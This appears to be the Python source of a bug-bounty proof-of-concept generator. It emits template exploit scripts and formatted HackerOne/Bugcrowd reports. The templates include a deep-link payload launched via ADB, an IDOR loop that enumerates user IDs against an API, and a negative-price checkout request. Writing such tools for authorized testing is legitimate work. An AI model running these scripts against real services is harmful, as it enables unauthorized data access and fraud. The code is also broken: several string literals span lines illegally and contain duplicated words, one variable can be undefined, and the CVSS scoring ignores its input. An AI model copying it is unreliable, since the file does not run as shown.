"""
Automated PoC Generator
Generates ready-to-submit Proof of Concept code for bug bounties

Features:
1. Python exploit scripts
2. Bash one-liners
3. cURL commands
4. Frida scripts
5. ADB commands
6. HackerOne/Bugcrowd formatted reports
"""
from typing import Dict, Any, List
from dataclasses import dataclass
from pathlib import Path
from rich.console import Console

console = Console()


@dataclass
class PoC:
    """Proof of Concept"""
    vuln_type: str
    severity: str
    title: str
    description: str
    impact: str
    steps_to_reproduce: List[str]
    poc_code: str
    poc_type: str  # python, bash, curl, frida, adb
    remediation: str
    cvss_score: float = 0.0


class PoCGenerator:
    """
    Automated Proof of Concept generator for bug bounties
    Generates ready-to-submit PoC code
    """
    
    def __init__(self):
        self.pocs: List[PoC] = []
    
    def generate_deeplink_poc(self, vuln_data: Dict[str, Any]) -> PoC:
        """Generate PoC for deep link vulnerability"""
        deep_link = vuln_data.get("deep_link", "myapp://")
        payload = vuln_data.get("payload", "test")
        vuln_type = vuln_data.get("vuln_type", "XSS")
        
        # Generate ADB command
        adb_command = f'adb shell am start -a android.intent.action.VIEW -d "{deep_link}?param={payload}"'
        
        # Generate Python script
        python_script = f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for {vuln_type} via Deep Link
\"\"\"
import subprocess

def exploit():
    deep_link = "{deep_link}?param={payload}"
    
    # Launch app with malicious deep link
    cmd = ['adb', 'shell', 'am', 'start', '-a', 
           'android.intent.action.VIEW', '-d', deep_link]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Exploit sent successfully")
        print(f"[+] Deep link: {{deep_link}}")
    else:
        print(f"[-] Failed: {{result.stderr}}")

if __name__ == "__main__":
    exploit()
"""
        
        poc = PoC(
            vuln_type=vuln_type,
            severity=vuln_data.get("severity", "medium"),
            title=f"{vuln_type} via Deep Link Parameter",
            description=f"The application's deep link handler does not properly sanitize the 'param' parameter,
                allowing {vuln_type} attacks.",
                
            impact=f"An attacker can craft a malicious deep link to execute {vuln_type} in the context of the application.",
            steps_to_reproduce=[
                "1. Install the vulnerable application",
                "2. Run the PoC script or ADB command",
                f"3. Observe {vuln_type} execution"
            ],
            poc_code=python_script,
            poc_type="python",
            remediation="Sanitize and
                and validate all deep link parameters before processing. Implement input validation
                and output encoding.",
            cvss_score=self._calculate_cvss(vuln_type, "medium")
        )
        
        return poc
    
    def generate_api_poc(self, vuln_data: Dict[str, Any]) -> PoC:
        """Generate PoC for API vulnerability"""
        endpoint = vuln_data.get("endpoint", "/api/users")
        method = vuln_data.get("method", "GET")
        vuln_type = vuln_data.get("vuln_type", "IDOR")
        
        # Generate cURL command
        curl_command = f"""curl -X {method} \\
  'https://api.example.com{endpoint}' \\
  -H 'Authorization: Bearer YOUR_TOKEN' \\
  -H 'Content-Type: application/json'"""
        
        # Generate Python script
        python_script = f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for {vuln_type}
\"\"\"
import requests

def exploit():
    base_url = "https://api.example.com"
    endpoint = "{endpoint}"
    
    headers = {{
        "Authorization": "Bearer YOUR_TOKEN",
        "Content-Type": "application/json"
    }}
    
    # Test IDOR by accessing other user's data
    for user_id in range(1, 100):
        url = f"{{base_url}}{{endpoint.replace('/123', f'/{{user_id}}')}}"
        
        response = requests.{method.lower()}(url, headers=headers)
        
        if response.status_code == 200:
            print(f"[+] Accessed user {{user_id}}: {{response.json()}}")
        elif response.status_code == 403:
            print(f"[-] Access denied for user {{user_id}}")

if __name__ == "__main__":
    exploit()
"""
        
        poc = PoC(
            vuln_type=vuln_type,
            severity=vuln_data.get("severity", "high"),
            title=f"{vuln_type} in {endpoint}",
            description=f"The API endpoint {endpoint} does not properly validate user authorization,
                allowing access to other users' data.",
                
            impact="An attacker can access, modify, or
                or delete other users' sensitive information by manipulating the user ID parameter.",
            steps_to_reproduce=[
                "1. Authenticate as a normal user",
                "2. Capture the API request",
                "3. Change the user ID to another user's ID",
                "4. Observe unauthorized access to other user's data"
            ],
            poc_code=python_script,
            poc_type="python",
            remediation="Implement proper authorization checks. Verify that the authenticated user has permission to access the requested resource.",
            cvss_score=self._calculate_cvss(vuln_type, "high")
        )
        
        return poc
    
    def generate_business_logic_poc(self, vuln_data: Dict[str, Any]) -> PoC:
        """Generate PoC for business logic flaw"""
        flaw_type = vuln_data.get("flaw_type", "Price Manipulation")
        endpoint = vuln_data.get("endpoint", "/api/checkout")
        
        python_script = f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for {flaw_type}
\"\"\"
import requests

def exploit():
    url = "https://api.example.com{endpoint}"
    
    headers = {{
        "Authorization": "Bearer YOUR_TOKEN",
        "Content-Type": "application/json"
    }}
    
    # Attempt price manipulation
    payload = {{
        "item_id": "12345",
        "quantity": 1,
        "price": -100  # Negative price
    }}
    
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Price manipulation successful!")
        print(f"[+] Response: {{response.json()}}")
    else:
        print(f"[-] Failed: {{response.status_code}}")

if __name__ == "__main__":
    exploit()
"""
        
        poc = PoC(
            vuln_type=flaw_type,
            severity="high",
            title=f"{flaw_type} in Checkout Flow",
            description=f"The application does not validate prices server-side, allowing users to set arbitrary prices including negative values.",
            impact="An attacker can purchase items for free or even receive money by setting negative prices.",
            steps_to_reproduce=[
                "1. Add item to cart",
                "2. Intercept checkout request",
                "3. Modify price to negative value",
                "4. Complete purchase",
                "5. Observe free/paid purchase"
            ],
            poc_code=python_script,
            poc_type="python",
            remediation="Always validate prices server-side. Never trust client-provided pricing information.",
            cvss_score=self._calculate_cvss(flaw_type, "high")
        )
        
        return poc
    
    def generate_hackerone_report(self, poc: PoC) -> str:
        """Generate HackerOne formatted report"""
        report = f"""# {poc.title}

## Summary

{poc.description}

## Severity

**{poc.severity.upper()}** (CVSS: {poc.cvss_score})

## Steps To Reproduce

{chr(10).join(poc.steps_to_reproduce)}

## Impact

{poc.impact}

## Proof of Concept

```{poc.poc_type}
{poc.poc_code}
```

## Remediation

{poc.remediation}

## Supporting Material/References

- OWASP Mobile Security Testing Guide
- CWE Reference

## System Information

- Platform: Android/iOS
- App Version: [VERSION]
- Device: [DEVICE]
"""
        return report
    
    def generate_bugcrowd_report(self, poc: PoC) -> str:
        """Generate Bugcrowd formatted report"""
        report = f"""**Title:** {poc.title}

**Severity:** {poc.severity.upper()}

**Description:**
{poc.description}

**Steps to Reproduce:**
{chr(10).join(poc.steps_to_reproduce)}

**Proof of Concept:**
```{poc.poc_type}
{poc.poc_code}
```

**Impact:**
{poc.impact}

**Remediation:**
{poc.remediation}

**CVSS Score:** {poc.cvss_score}
"""
        return report
    
    def _calculate_cvss(self, vuln_type: str, severity: str) -> float:
        """Calculate CVSS score"""
        base_scores = {
            "critical": 9.0,
            "high": 7.5,
            "medium": 5.5,
            "low": 3.5
        }
        
        return base_scores.get(severity.lower(), 5.0)
    
    def save_poc(self, poc: PoC, output_dir: str = "./pocs") -> str:
        """Save PoC to file"""
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        # Save Python script
        if poc.poc_type == "python":
            script_path = output_path / f"{poc.vuln_type.replace(' ', '_').lower()}_poc.py"
            script_path.write_text(poc.poc_code)
            console.print(f"[green]✓ Saved PoC: {script_path}[/green]")
        
        # Save HackerOne report
        report_path = output_path / f"{poc.vuln_type.replace(' ', '_').lower()}_report.md"
        report = self.generate_hackerone_report(poc)
        report_path.write_text(report)
        console.print(f"[green]✓ Saved report: {report_path}[/green]")
        
        return str(script_path)


if __name__ == "__main__":
    generator = PoCGenerator()
    console.print("[bold]PoC Generator ready[/bold]")
